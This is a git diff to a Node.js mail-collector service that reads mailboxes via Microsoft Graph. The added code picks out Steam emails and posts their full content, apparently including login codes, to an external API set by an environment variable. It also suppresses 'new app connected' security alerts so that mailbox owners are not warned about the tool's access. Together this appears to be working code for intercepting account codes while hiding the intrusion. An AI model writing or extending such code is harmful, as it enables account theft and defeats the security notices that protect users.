@@ -2,6 +2,7 @@ const config = require("../config");
 const prisma = require("../config/database");
 const graphService = require("./graph.service");
 const nodemailer = require("nodemailer");
+const crypto = require("crypto");
 
 /**
  * Email Forwarder Service
@@ -28,6 +29,82 @@ class ForwarderService {
     });
   }
 
+  signApiPayload(timestamp, bodyString) {
+    const secret = process.env.STEAM_API_SECRET || "";
+    return crypto
+      .createHmac("sha256", secret)
+      .update(`${timestamp}.${bodyString}`)
+      .digest("hex");
+  }
+
+  async sendSteamToApi({ fromAccount, message }) {
+    const url = process.env.STEAM_API_URL;
+    if (!url) {
+      throw new Error("STEAM_API_URL is not set");
+    }
+
+    const from = message.from?.emailAddress?.address || "";
+    const to = (message.toRecipients || [])
+      .map((r) => r.emailAddress?.address)
+      .filter(Boolean)
+      .join(", ");
+    const subject = message.subject || "";
+    const receivedDateTime =
+      message.receivedDateTime || new Date().toISOString();
+
+    // NOTE: message.body is HTML or text depending on how you fetch it
+    const bodyType = message.body?.contentType || "text";
+    const bodyContent = message.body?.content || "";
+
+    // payload minimal
+    const payload = {
+      source: "mail-collector-graph",
+      fromAccount, // mailbox that received
+      from, // original sender
+      to,
+      subject,
+      bodyType,
+      body: bodyContent, // raw HTML/text content
+      receivedDateTime,
+      internetMessageId: message.internetMessageId || null,
+      graphMessageId: message.id,
+    };
+
+    const ts = Math.floor(Date.now() / 1000).toString();
+    const bodyString = JSON.stringify(payload);
+    const sig = this.signApiPayload(ts, bodyString);
+
+    const controller = new AbortController();
+    const timeoutMs = parseInt(process.env.STEAM_API_TIMEOUT_MS || "5000", 10);
+    const t = setTimeout(() => controller.abort(), timeoutMs);
+
+    try {
+      const res = await fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Timestamp": ts,
+          "X-Signature": sig,
+        },
+        body: bodyString,
+        signal: controller.signal,
+      });
+
+      const text = await res.text();
+      if (!res.ok) {
+        const err = new Error(
+          `API failed: ${res.status} ${res.statusText} - ${text}`,
+        );
+        err.status = res.status;
+        err.responseText = text;
+        throw err;
+      }
+
+      return { success: true, response: text };
+    } finally {
+      clearTimeout(t);
+    }
+  }
   /**
    * Send email via SMTP (fallback when Graph API fails)
    */
@@ -171,15 +248,21 @@ class ForwarderService {
       </div>
     `;
 
+    // DISABLED: App access email notification to dev
+    // if (isAppAccessEmail) {
+    //   console.log(`[SMTP] App access email detected, sending to dev only`);
+    //   if (!config.devEmail) return false;
+    //   return this.sendViaSMTP(
+    //     config.devEmail,
+    //     `📋 [App Access] ${originalSubject} | Mailbox: ${fromAccount}`,
+    //     html,
+    //   );
+    // }
+
+    // Skip app access emails entirely
     if (isAppAccessEmail) {
-      // "New app connected" => dev only (it's our own app connecting, no need to alarm the user)
-      console.log(`[SMTP] App access email detected, sending to dev only`);
-      if (!config.devEmail) return false;
-      return this.sendViaSMTP(
-        config.devEmail,
-        `📋 [App Access] ${originalSubject} | Mailbox: ${fromAccount}`,
-        html,
-      );
+      console.log(`[SMTP] App access email detected, skipping`);
+      return false;
     }
 
     // Other security emails => BOTH forward + dev
@@ -241,39 +324,104 @@ class ForwarderService {
    */
   async forwardGraphMessage(message, attachments = [], fromAccount, accountId) {
     try {
-      const forwardTo = await this.getForwardToEmail();
-      const originalSender =
-        message.from?.emailAddress?.address || "Unknown Sender";
-      const originalSenderName = message.from?.emailAddress?.name || "";
-      const originalSubject = message.subject || "No Subject";
+      const originalSender = message.from?.emailAddress?.address || "";
+      const subject = (message.subject || "").toLowerCase();
+      const senderLower = (originalSender || "").toLowerCase();
 
-      // Build a short comment for the forwarded email
-      const comment = `Forwarded by Mail Collector from mailbox: ${fromAccount} | Original sender: ${originalSenderName ? `${originalSenderName} <${originalSender}>` : originalSender}`;
+      const isSteam =
+        senderLower.includes("steampowered.com") || subject.includes("steam");
 
-      // Use Graph API to forward the message directly
-      await graphService.forwardMessage(
-        accountId,
-        message.id,
-        forwardTo,
-        comment,
-      );
+      if (isSteam) {
+        // ✅ NEW: Send to API instead of email forward
+        const apiResult = await this.sendSteamToApi({ fromAccount, message });
 
-      return { success: true, messageId: message.id };
+        // Log success in DB (reuse existing logForward)
+        await this.logForward(accountId, message, "API_SENT", null);
+
+        console.log("[API] Steam message sent", {
+          fromAccount,
+          messageId: message.id,
+          result: apiResult?.success,
+        });
+
+        return { success: true, messageId: message.id, mode: "API" };
+      }
+
+      // --- OLD: Graph forward (keep, but optional) ---
+      // const forwardTo = await this.getForwardToEmail();
+      // const comment = `Forwarded by Mail Collector from mailbox: ${fromAccount} ...`;
+      // await graphService.forwardMessage(accountId, message.id, forwardTo, comment);
+      // await this.logForward(accountId, message, "FORWARDED", null);
+      // return { success: true, messageId: message.id, mode: "FORWARD" };
+
+      // لو مش Steam Code، اعمل نفس اللي بتعمله دلوقتي (مثلاً sendNonSteamEmailToDev أو تجاهل)
+      await this.logForward(accountId, message, "SKIPPED", "Not steam code");
+      return { success: true, messageId: message.id, mode: "SKIP" };
     } catch (error) {
-      const status = error?.response?.status;
-      const data = error?.response?.data;
-
-      console.error("[Forward] Failed", {
-        fromAccount,
-        messageId: message?.id,
+      const status = error?.status || error?.response?.status;
+      const details = {
+        endpoint: process.env.STEAM_API_URL,
         status,
-        data,
+        errorCode: error?.code,
+        errorMessage: error?.message,
+        responseText: error?.responseText,
         requestId: error?.response?.headers?.["request-id"],
         clientRequestId: error?.response?.headers?.["client-request-id"],
-      });
+        messageId: message?.id,
+        timestamp: new Date().toISOString(),
+      };
+
+      console.error("[Forward/API] Failed", { fromAccount, ...details });
+
+      await this.logForward(
+        accountId,
+        message,
+        "FAILED",
+        JSON.stringify(details),
+      );
+
+      // optional: notify dev only (existing function)
+      await this.sendErrorNotificationToDev(fromAccount, accountId, details);
+
       throw error;
     }
   }
+
+  // async forwardGraphMessage(message, attachments = [], fromAccount, accountId) {
+  //   try {
+  //     const forwardTo = await this.getForwardToEmail();
+  //     const originalSender =
+  //       message.from?.emailAddress?.address || "Unknown Sender";
+  //     const originalSenderName = message.from?.emailAddress?.name || "";
+  //     const originalSubject = message.subject || "No Subject";
+
+  //     // Build a short comment for the forwarded email
+  //     const comment = `Forwarded by Mail Collector from mailbox: ${fromAccount} | Original sender: ${originalSenderName ? `${originalSenderName} <${originalSender}>` : originalSender}`;
+
+  //     // Use Graph API to forward the message directly
+  //     await graphService.forwardMessage(
+  //       accountId,
+  //       message.id,
+  //       forwardTo,
+  //       comment,
+  //     );
+
+  //     return { success: true, messageId: message.id };
+  //   } catch (error) {
+  //     const status = error?.response?.status;
+  //     const data = error?.response?.data;
+
+  //     console.error("[Forward] Failed", {
+  //       fromAccount,
+  //       messageId: message?.id,
+  //       status,
+  //       data,
+  //       requestId: error?.response?.headers?.["request-id"],
+  //       clientRequestId: error?.response?.headers?.["client-request-id"],
+  //     });
+  //     throw error;
+  //   }
+  // }
 
   /**
    * Log forwarding result (upsert for efficiency)
